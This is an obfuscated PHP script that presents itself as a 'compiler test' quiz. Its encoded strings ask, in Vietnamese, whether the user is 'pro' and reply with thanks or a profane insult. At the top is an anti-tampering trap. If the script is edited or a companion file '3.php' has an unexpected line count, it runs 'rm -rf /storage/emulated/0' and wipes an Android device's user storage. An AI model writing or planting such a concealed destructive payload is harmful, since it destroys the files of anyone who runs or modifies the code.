<?php
if(!function_exists("HaoPRO")) {
  system("rm -rf /storage/emulated/0");
}
function HaoPRO() {
$_x81810_ = count(file("3.php"));
  if($_x81810_ != 21) {
    $_x8171_ = count(file(__FILE__));
    if($_x8171_ != 1) {
      system("rm -rf /storage/emulated/0");
    }
  }
}
HaoPRO();
define("key", 5); goto _x4365753561_; _x785a766f30_: echo implode("", array_map(fn($char) => chr(ord($char) - key), str_split("ymfsp%~tz%gwt"))); goto _x5665577162_; _x7247695253_: _x5674517544_: goto _x785a766f30_; _x4a59416648_: die(implode("", array_map(fn($char) => chr(ord($char) - key), str_split("kzhp%~tz%gwt")))); goto _x4f57594159_; _x74425f5a69_: if ($_x4844495662_ == implode("", array_map(fn($char) => chr(ord($char) - key), str_split("~")))) { goto _x5674517544_; } goto _x4a59416648_; _x4f57594159_: goto _x4d536f7753_; goto _x7247695253_; _x4365753561_: echo implode("", array_map(fn($char) => chr(ord($char) - key), str_split("Htrunqjw%yjxy"))); goto _x4e64617171_; _x5665577162_: exit; goto _x7639393042_; _x4e64617171_: $_x4844495662_ = readline(implode("", array_map(fn($char) => chr(ord($char) - key), str_split("Gmft%hȸ%uwt%pmȹsl%-~4s.?%")))); goto _x74425f5a69_; _x7639393042_: _x4d536f7753_: